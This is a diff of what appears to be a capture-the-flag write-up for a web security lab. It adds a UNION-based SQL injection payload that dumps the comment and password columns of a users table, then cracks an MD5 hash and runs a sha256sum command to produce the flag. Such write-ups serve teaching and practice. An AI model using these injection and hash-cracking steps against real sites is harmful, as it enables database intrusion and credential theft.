@@ -20,5 +20,15 @@ town,last_name,first_name,user_id,country,planet,countersign,Commentaire
 ```
 Let's check the `Commentaire` column values:
 ```SQL
-1 UNION ALL SELECT 1, Commentaire FROM users
+1 UNION ALL SELECT Commentaire, countersign FROM users
 ```
+This will return the `Commentaire` and `countersign` columns from the `users` table. But one of the values is :
+```
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+```
+If we decrypt `5ff9d0165b4f92b14994e5c685cdce28` in MD5 we get `FortyTwo`. Then encrypt it with SHA256 and lower all the characters:
+```bash
+echo -n "fortytwo" | sha256sum | cut -d ' ' -f 1
+```
+We get the flag.
